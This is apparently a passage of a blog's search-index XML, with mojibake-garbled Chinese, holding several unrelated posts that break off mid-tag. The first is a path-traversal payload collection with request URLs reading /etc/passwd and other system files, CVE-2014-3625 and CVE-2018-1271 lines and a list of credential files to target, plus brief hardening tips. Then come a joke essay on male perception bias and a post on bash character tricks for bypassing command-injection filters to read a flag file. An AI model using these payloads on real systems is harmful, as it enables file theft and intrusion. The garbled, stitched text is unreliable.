class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">xx.php?vt&#x3D;&amp;cate&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;doc&#x2F;index?md&#x3D;diagnose_api&amp;app&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;pcheck&#x2F;index.php?action&#x3D;showPcheck&amp;report&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;xx&#x2F;img.php?s&#x3D;16,40&amp;n&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;2xx.xx.xx.xx:8080&#x2F;xampp&#x2F;showcode.php&#x2F;c:xampp&#x2F;htdocs&#x2F;xampp&#x2F;showcode.php?showcode&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;xx.xx.com&#x2F;static&#x2F;images&#x2F;couch-ipad.png..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;frame_scc&#x2F;downLoad?template&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.12.22.xx&#x2F;downloadFile.do?fileName&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="CVE-2014-3625"><a href="#CVE-2014-3625" class="headerlink" title="CVE-2014-3625"></a>CVE-2014-3625</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;passwd </span><br><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-1271"><a href="#CVE-2018-1271" class="headerlink" title="CVE-2018-1271"></a>CVE-2018-1271</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;spring-mvc-showcase&#x2F;resources&#x2F;xxx&#x2F;..%5c&#x2F;..%5c&#x2F;..%5c&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h2 id="è·¯å¾„éå†æ£€æµ‹"><a href="#è·¯å¾„éå†æ£€æµ‹" class="headerlink" title="è·¯å¾„éå†æ£€æµ‹"></a>è·¯å¾„éå†æ£€æµ‹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)</span><br><span class="line">&#x2F;proc&#x2F;mounts</span><br><span class="line">&#x2F;proc&#x2F;config.gz&#x2F;etc&#x2F;my.cnf</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD</span><br><span class="line">C:\Windows\php.in</span><br><span class="line">C:\Windows\my.ini</span><br><span class="line">C:\boot.int</span><br><span class="line">C:\Windows\System32\inetsrc\MetaBase.xml</span><br><span class="line">C:\Windows\repair\sam</span><br><span class="line">..&#x2F;..&#x2F;ierp&#x2F;bin&#x2F;prop.xml</span><br></pre></td></tr></table></figure><h2 id="é˜²å¾¡-1"><a href="#é˜²å¾¡-1" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apache</span><br><span class="line">åœ¨httpd.confæ–‡ä»¶ä¸­æ‰¾åˆ°   Options +Indexes +FollowSymLinks +ExecCGI  å¹¶ä¿®æ”¹æˆ   Options -Indexes+FollowSymLinks +ExecCGI  å¹¶ä¿å­˜</span><br><span class="line"></span><br><span class="line">Tomcat</span><br><span class="line">ä¿®æ”¹conf&#x2F;web.xmlï¼Œå°†true æ”¹ä¸ºfalse é‡å¯tomcat</span><br><span class="line"></span><br><span class="line">IIS</span><br><span class="line">1ã€åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ‰“å¼€ æ§åˆ¶é¢æ¿ --&gt;ç®¡ç†å·¥å…·--&gt; IISç®¡ç†å™¨</span><br><span class="line">2ã€å³å‡»é»˜è®¤ç½‘ç«™ --&gt; å±æ€§--&gt; ä¸»ç›®å½• --&gt;å–æ¶ˆâ€œç›®å½•æµè§ˆâ€å¤é€‰æ¡†</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°è°ˆæ€§çŸ¥è§‰åå·®å¯¼è‡´èœœæ±è‡ªä¿¡</title>
      <link href="2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/"/>
      <url>2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>äººç”Ÿä¸‰å¤§é”™è§‰ï¼šğŸ“±æŒ¯åŠ¨ã€ğŸ‘´èƒ½åæ€ï¼ˆğŸ‘´ç¡®å®å¯ä»¥åæ€ï¼Œç¡®å®å¯ä»¥å•Šï¼ï¼‰ã€å¥¹å–œæ¬¢ğŸ‘´</p><p>â€Taå–œæ¬¢ğŸ‘´ä¸ºç”šä¹ˆè¿˜ä¸æ‰¿è®¤â€œï¼Œæˆ–è®¸å¯ä»¥ç”¨æ€§çŸ¥è§‰åå·®æ¥è§£é‡Šã€‚</p><p>è™½ç„¶æŒ‰ç†æ¥è¯´â€Taæ˜æ˜æš—æ‹æˆ‘ï¼Œå°±æ˜¯ä¸è‚¯å‹‡æ•¢æ‰¿è®¤è‡ªå·±çš„æ„Ÿæƒ…â€œè¿™ç§é”™è§‰æ˜¯ä¸åˆ†ç”·å¥³çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´åŸºæœ¬ä¸Šæ˜¯ç”·æ€§å æ¯”å¤šï¼Œå¯¹äºä¸€ä¸ªæ™®é€šçš„ã€æ­£å¸¸çš„ã€å‹å¥½çš„è¡¨ç¤ºï¼Œç”·æ€§æ™®éæ€§åœ°å®¹æ˜“è¯¯è§£ä¸ºçˆ±æƒ…ï¼Œåœ¨ä¸¤æ€§ä¸­è™½ç„¶éƒ½ä¼šæœ‰è®¤çŸ¥ä¸æ­£ç¡®çš„æ—¶å€™ï¼Œä½†æ˜¯ç”·æ€§æ›´å®¹æ˜“äº§ç”Ÿè¿™ç§Taå–œæ¬¢æˆ‘çš„å¤¸å¤§å‹æ€§çŸ¥è§‰åå·®ã€‚</p><hr><p>å¿ƒç†å­¦å®¶åšè¿‡çš„ç ”ç©¶ï¼š</p><p>â€‹    æ‰¾ä¸€äº›ç”·å¥³å¤§å­¦ç”Ÿæ¥è§‚çœ‹æŸä¸ªå½•åƒï¼Œå½•åƒå†…å®¹æ˜¯ä¸€ä¸ªæ•™æˆå’Œä¸€ä¸ªå¥³å­¦ç”Ÿè°ˆè¯ï¼Œå¥³å­¦ç”Ÿæƒ³è¦è®ºæ–‡å»¶æœŸï¼Œæ•™æˆå’Œå¥³å­¦ç”Ÿäº¤æµå¾—æ¯”è¾ƒå‹å¥½ï¼Œå—·ï¼Œä¸¤ä¸ªæ¼”æŠ€å¾ˆç²¾æ¹›çš„æ¼”å‘˜ä¹Ÿæ³¨æ„äº†ä»…ä»…åªæ˜¯è¡¨ç°å‹å¥½ï¼Œä¸è¦è¡¨ç°å¾—è½»æµ®å’ŒæŒ‘é€—ã€‚</p><p>ç»“æœï¼š</p><p>â€‹    å¥³ç”Ÿä»¬ï¼šå½•åƒä¸­åªçœ‹åˆ°å¥³å­©å­çš„å‹å¥½ï¼Œå…³äºæ€§æ„Ÿã€æ€§è¯±æƒ‘è¿™ç±»çš„æ²¡çœ‹å‡ºæ¥ï¼Œè€Œç”·ç”Ÿä»¬åˆ™çº·çº·è¡¨ç¤ºçœ‹å‡ºæ¥è¿™ä¸ªå¥³å­©å­æ˜æ˜¾æœ‰æ€§æ–¹é¢çš„å±•ç°å’Œè¯±æƒ‘ã€‚</p><p>å¦å¤–çš„ä¸€ä¸ªç ”ç©¶ï¼š</p><p>â€‹    çœ‹çš„æ˜¯ä¸¤ä¸ªç”·å¥³åŒå­¦äº’ç›¸åœ¨å­¦ä¹ çš„ç…§ç‰‡ï¼Œç„¶åå›¾ç‰‡ä¸­çš„å¥³å­©å­å¯¹è¿™ä¸ªç”·çš„æœ‰æ²¡æœ‰æ„æ€ã€‚</p><p>ç»“æœï¼š</p><p>â€‹    å¤§éƒ¨åˆ†å¥³ç”Ÿçœ‹åˆ°ï¼ˆè§‰å¾—ï¼‰æ²¡æœ‰å•Šï¼Œä¸¤ä¸ªäººå¾ˆæ­£å¸¸å•Šï¼Œä½†ç”·ç”Ÿä¸€çœ‹ä¸å¯¹ï¼Œè¿™ä¸ªå¥³å­©å­å¯¹è¿™ä¸ªç”·å­©å­æœ‰æ„æ€ï¼Œæœ‰æ„æ€ï¼Œè‚¯å®šæœ‰æ„æ€å“ˆï¼Œç”·ç”Ÿä»¬æ™®éè®¤ä¸ºç…§ç‰‡ä¸­çš„å¥³å­©å­å¿ƒä¸åœ¨ç„‰ï¼Œå¿ƒä¸åœ¨å­¦ä¹ ï¼Œè¡¨ç°å‡ºäº†å¾ˆæ˜æ˜¾çš„æ€§æ„Ÿå’Œå¯¹ç”·å­©å­çš„è¯±æƒ‘ã€‚</p><hr><p>è¿™äº›åå·®ä¹Ÿå¹¶ä¸åªé€‚ç”¨äºæ™®ä¿¡ç”·ï¼ˆæ™®é€šè€Œåˆè‡ªä¿¡ï¼‰ï¼Œä¹Ÿé€‚ç”¨äºä¸€äº›å…·æœ‰è¾ƒé«˜é…å¶ä»·å€¼çš„äººï¼Œå°±æ¯”å¦‚ç”·é¢†å¯¼ï¼Œäº‹ä¸šæœ‰æˆå‹ç”·äººæ›´å®¹æ˜“äº§ç”Ÿè¿™ç§é”™è§‰ï¼Œæ¬¸ï¼ŒğŸ‘´çš„å¥³ä¸‹å±è¿™äº›äººå¯¹ğŸ‘´æœ‰æ„æ€å¥¥ï¼Œæ‰€ä»¥ä¸€äº›å·¥ä½œåœºæ™¯ä¸­çš„æ€§éªšæ‰°é—®é¢˜ä¹Ÿæºäºæ­¤ ã€‚</p><p>å¥³æ€§æ˜æ˜åªæ˜¯ä¸€ç§å‹å¥½çš„è¡¨ç¤ºï¼Œä½†å¯¹æ–¹å´å¾€å¾€å¯ä»¥è¯¯è§£ä¸ºå¥¹æ˜¯å¯¹æˆ‘å¿ƒæœ‰æ‰€å±ï¼Œæ›´æœ‰æ„æ€çš„æ˜¯ï¼Œå½“ç”·æ€§é‡åˆ°æ¼‚äº®çš„æ€§æ„Ÿçš„å¥³æ€§çš„æ—¶å€™æ›´å®¹æ˜“äº§ç”Ÿè¿™ç§åå·®ï¼Œä¸»è¦æƒ³ä¸€æƒ³ï¼Œäººå®¶æ¼‚äº®çš„å¦¹å­æ‹©å¶æ ‡å‡†éƒ½å·²ç»å¤Ÿé«˜äº†ï¼Œä¸ºç”šä¹ˆå°±è¿™ä¹ˆé‚£å•¥è€Œä¸çŸ¥å‘¢ã€‚</p><p>å…¶åŸå› å°±åœ¨äºæ¼«é•¿çš„äººç±»è¿›åŒ–è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œä¸¤æ€§ä»è¿›åŒ–çš„æ ¹æºä¸Šæ¥è®²ï¼ŒTaä»¬çš„æ€§é€‰æ‹©ã€æ‹©å¶ç­–ç•¥æ˜¯ä¸åŒçš„ï¼Œå¥³æ€§ç”±äºå­©å­çš„æŠšå…»ç­‰é—®é¢˜éœ€è¦ä¸€ä¸ªç¨³å®šæœ‰èµ„æºçš„ç”·å£«ï¼Œæ‰€ä»¥å¥³æ€§åœ¨æ‹©å¶ä¸­éƒ½æ˜¯å¾ˆæ…é‡çš„ï¼Œè€Œç”·æ€§åˆ™ä¸ç„¶ï¼ŒTaåœ¨æ•´ä¸ªç”Ÿæ®–è¿‡ç¨‹æ‰€è´Ÿæ‹…çš„å¹¶ä¸æ˜¯é‚£ä¹ˆå¤šï¼Œæ‰€ä»¥ç”·æ€§ä¼šè¿½æ±‚æ›´å¤šçš„å¼‚æ€§ï¼Œåœ¨æ›´å¤šçš„ä¸¤æ€§æ¬¢æ„‰ä¹‹ä¸­æ‰èƒ½æå‡è‡ªå·±åŸºå› ä¼ é€’ä¸‹å»çš„æ¯”ç‡ã€‚</p><p>å¯¹äºç”·æ€§è€Œè¨€ï¼ŒTaå¯¹å¥³æ€§çš„æƒ…æ„Ÿè®¤çŸ¥å®¹æ˜“çŠ¯ä¸¤æ–¹é¢é”™è¯¯ï¼Œä¸€æ˜¯å¯¹æ–¹å¯¹ğŸ‘´æ²¡æ„æ€ï¼Œè€ŒğŸ‘´è§‰å¾—å¯¹æ–¹æœ‰æ„æ€ï¼Œè¿™æ˜¯ä¸€ç§è¯¯æŠ¥ï¼Œå¦å¤–æ˜¯å¯¹æ–¹å¯¹ğŸ‘´æœ‰æ„æ€ï¼Œè€ŒğŸ‘´åˆ¤æ–­Taæ²¡æ„æ€ï¼Œè¿™æ˜¯ä¸€ç§æ¼æŠ¥ï¼Œä¸¤ç§é”™è¯¯æƒè¡¡ä¸‹æ¥ï¼Œç”·æ€§åšå‡ºçš„é€‰æ‹©æ˜¯ï¼šå®å¯è¯¯æŠ¥ï¼Œä¸å¯æ¼æŠ¥ï¼Œå®å¯é”™æ€ä¸€åƒï¼Œä¸èƒ½æ”¾è¿‡ä¸€ä¸ªã€‚</p><p>è¿›åŒ–çš„åŠ¨åŠ›è®©ç”·æ€§æŠŠä»»ä½•çš„å¥³æ€§çš„å¥½æ„Ÿéƒ½è§£é‡Šä¸ºæ€§æ–¹é¢çš„å…´è¶£ï¼Œæ‰€ä»¥æœ‰äº†å…¸å‹çš„å¾®ç¬‘å½“çˆ±æƒ…è¿™ç§ææ³•ï¼Œè¯´ç™½äº†ï¼Œè¿™ä¸€ç±»çš„ç”·æ€§å‘¢ï¼Œå°±æ˜¯ç”¨ä¸‹åŠèº«æ€è€ƒçš„åŠ¨ç‰©ã€‚</p><p>ä¸è¿‡æœ€åè¿˜æ˜¯è¯´ä¸€å¥ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç”·æ€§éƒ½æ˜¯è¿™ä¸ªæ ·å­ï¼Œæœ¬æ–‡ä¹Ÿåªæ˜¯å›¾ä¸€ä¹ï¼Œå¼€å¼€ç©ç¬‘ï¼Œè°ƒä¾ƒå‡ å¥ã€‚</p><p>å·®ä¸å¤šå¾—äº†ï¼Œæºœä¹‹ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›shellçš„éªšæ“ä½œ</title>
      <link href="2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="æ„é€ ä»»æ„æ•°å­—"><a href="#æ„é€ ä»»æ„æ•°å­—" class="headerlink" title="æ„é€ ä»»æ„æ•°å­—"></a>æ„é€ ä»»æ„æ•°å­—</h1><p>å¾ˆä¹…ä¹‹å‰æ— æ„é—´å‘ç° <code>$(())</code> è¿™ä¸ªå¥½ç©çš„ç©æ„å„¿ï¼Œæœ‰è¿‡ä¸€æ³¢æ·±â™‚å…¥</p><table><thead><tr><th>æ•°å­—</th><th>æ„é€ </th></tr></thead><tbody><tr><td>-1</td><td>$((~$(())))</td></tr><tr><td>0</td><td>$(())</td></tr><tr><td>0</td><td>$#</td></tr><tr><td>1</td><td>$((<del>$(($((</del>$(())))$((~$(())))))))</td></tr><tr><td>1</td><td>$                                                        || 2    | $((~$(($((~$(())))$((~$(())))$((~$(())))))))                 || 2    | $(($&lt;&lt;$))                                            || 3    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))      || 3    | $(($(($&lt;&lt;$))#$$))                            || 4    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) || 4    | $(($&lt;&lt;$(($<<$))))</td></tr><tr><td>5</td><td>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((~$(())))))))</td></tr><tr><td>5</td><td>$(($(($<<$))#$$(())$))</td></tr><tr><td>6</td><td>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</td></tr><tr><td>6</td><td>$(($(($<<$))#$$$(())))</td></tr><tr><td>7</td><td>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((~$(())))))))</td></tr><tr><td>7</td><td>$(($(($<<$))#$$$))                       || 8    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) || 8    | ${LANG:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))}        || 9    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) |æœ‰ä¸€ä¸ªå¾ˆç‰¹æ®Šçš„ï¼š`$}</td></tr><tr><td>.</td><td>${LANG:$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((~$(()))))))):1}</td></tr><tr><td>/bin/cat</td><td>${SHELL::$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))))))}${PATH:$((</del>$(($((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(()))))))):2}${HOME:$((~$(()))):$}</td></tr></tbody></table><p>å¾…è¡¥å……â€¦â€¦</p><h2 id="åˆ©ç”¨-ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°"><a href="#åˆ©ç”¨-ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°" class="headerlink" title="åˆ©ç”¨ $ ( ) # ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°"></a>åˆ©ç”¨ $ ( ) # ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°</h2><p><code>$((2#1000001)) = 53</code></p><p>å½¢å¼: <code>$((2#&#123;äºŒè¿›åˆ¶&#125;))) = &#123;å…«è¿›åˆ¶&#125;</code></p><h2 id="åˆ©ç”¨-æ„é€ ä»»æ„æ•°"><a href="#åˆ©ç”¨-æ„é€ ä»»æ„æ•°" class="headerlink" title="åˆ©ç”¨ $ ( ) ~ æ„é€ ä»»æ„æ•°"></a>åˆ©ç”¨ $ ( ) ~ æ„é€ ä»»æ„æ•°</h2><p>ä»¥ <code>$(($(($a))$(($b))$(($c))$(($d))$(($e))$(($f))))</code> ä¸ºä¾‹å­å§ï¼š</p><h3 id="å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ"><a href="#å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ" class="headerlink" title="å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ"></a>å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ</h3><p>åªè¦æœ‰ä»»æ„ <code>$(($n))</code> ä¸ºè´Ÿæ•°ï¼Œåˆ™è¡¨è¾¾å¼çš„ç»“æœä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœæ˜¯æ­£æ•°ï¼Œåˆ™æ‹¼æ¥åˆ°å‰ä¸€ä½çš„æœ«å°¾</span><br><span class="line">å¦‚æœæ˜¯è´Ÿæ•°ï¼Œåˆ™ä¸å‰é¢åˆ†å¼€</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š<code>$(($((1))$((0))$((-1))$((1))$((2))$((1))))</code> çš„æƒ…å†µï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 1 0 -1 1 2 1</span><br><span class="line">=&gt; (10) + (-1121)</span><br><span class="line">=&gt; -1111</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š<code>$(($((-1))$((0))$((-1))$((1))$((2))$((1))))</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((-<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; -1 0 -1 1 2 1</span><br><span class="line">=&gt; (-10) + (-1121)</span><br><span class="line">=&gt; -1131</span><br></pre></td></tr></table></figure><p>äº¦æˆ–è€…ï¼š<code>$(($((6))$((0))$((-1))$((1))$((-3))$((1))))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">6</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((-<span class="number">3</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 6 0 -1 1 -3 1</span><br><span class="line">=&gt; (60) + (-11) + (-31)</span><br><span class="line">=&gt; 18</span><br></pre></td></tr></table></figure><h3 id="a-ä¸º-0-çš„æƒ…å†µ"><a href="#a-ä¸º-0-çš„æƒ…å†µ" class="headerlink" title="$(($a)) ä¸º 0 çš„æƒ…å†µ"></a>$(($a)) ä¸º 0 çš„æƒ…å†µ</h3><p>å½“ <code>$(($a))</code> ä¸º 0ï¼Œä¸”å…¶å®ƒéƒ½ä¸ºéè´Ÿæ•°æ—¶ï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœæœ€åä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">f * 2 ** 0 + <span class="variable">$e</span> * 2 ** 3 + <span class="variable">$d</span> * 2 ** 6 + <span class="variable">$c</span> * 2 ** 9 Â·Â·Â·Â·Â·Â·</span></span><br><span class="line">å³ä»æœ€åçš„ $(($n)) å¼€å§‹ï¼Œå¾€å‰æ¨ï¼Œç›´åˆ°ç¬¬ä¸€ä½</span><br></pre></td></tr></table></figure><h3 id="å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ"><a href="#å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ" class="headerlink" title="å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ"></a>å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ</h3><p>å¦‚æœæ‰€æœ‰çš„ <code>$(($n))</code> éƒ½ä¸ºæ­£æ•°ï¼Œåˆ™å…¨éƒ¨æ‹¼æ¥åœ¨ä¸€èµ·è¾“å‡ºâ€¦â€¦</p><h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>å‰ä¸ä¹…æƒ³æŠ˜ç£¨ä¸€ä¸‹å¤§ä¸€æ–°ç”Ÿï¼Œç‰¹æ„å»ç ”ç©¶äº†ä¸€ä¸‹</p><p>ç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /flag.txt æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼Œæ€è§£</p><figure class="highlight 